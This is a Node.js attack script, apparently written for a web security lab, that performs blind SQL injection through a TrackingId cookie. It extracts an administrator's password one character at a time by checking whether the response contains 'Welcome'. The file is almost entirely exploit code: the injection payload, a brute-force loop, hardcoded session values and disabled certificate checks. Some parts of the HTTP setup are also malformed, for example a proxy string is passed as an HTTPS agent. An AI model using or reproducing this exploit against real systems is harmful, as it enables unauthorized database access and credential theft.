const axios = require('axios');
const querystring = require('querystring');

const httpsAgent = new axios.create({
  httpsAgent: new require('https').Agent({  
    rejectUnauthorized: false
  })
});

const proxies = {
  http: 'localhost:3000/check-session',
  https: 'localhost:3000/check-session'
};

async function sqliPassword(url) {
  let passwordExtracted = "";
  for (let i = 1; i <= 20; i++) {
    for (let j = 32; j < 126; j++) {
      const sqliPayload = `' and (select ascii(substring(password,${i},1)) from users where username='administrator')='${j}'--`;
      const sqliPayloadEncoded = querystring.escape(sqliPayload);
      const cookies = `TrackingId=dCqiyv8E4BfhhpHL${sqliPayloadEncoded}; session=bdb4dZfXEcfucciq98jCIYBJW4NL7y7M`;

      try {
        const response = await httpsAgent.get(url, {
          headers: { 'Cookie': cookies },
          proxy: false,
          httpsAgent: proxies.https
        });
        if (!response.data.includes("Welcome")) {
          process.stdout.write(`\r${passwordExtracted}${String.fromCharCode(j)}`);
        } else {
          passwordExtracted += String.fromCharCode(j);
          process.stdout.write(`\r${passwordExtracted}`);
          break;
        }
      } catch (error) {
        console.error('Error during HTTP request:', error.message);
        return;
      }
    }
  }
}

function main() {
  const args = process.argv.slice(2);
  if (args.length !== 1) {
    console.log('(+) Usage: node script.js <url>');
    console.log('(+) Example: node script.js www.example.com');
    return;
  }
  
  const url = args[0];
  console.log('(+) Retrieving administrator password...');
  sqliPassword(url);
}

if (require.main === module) {
  main();
}
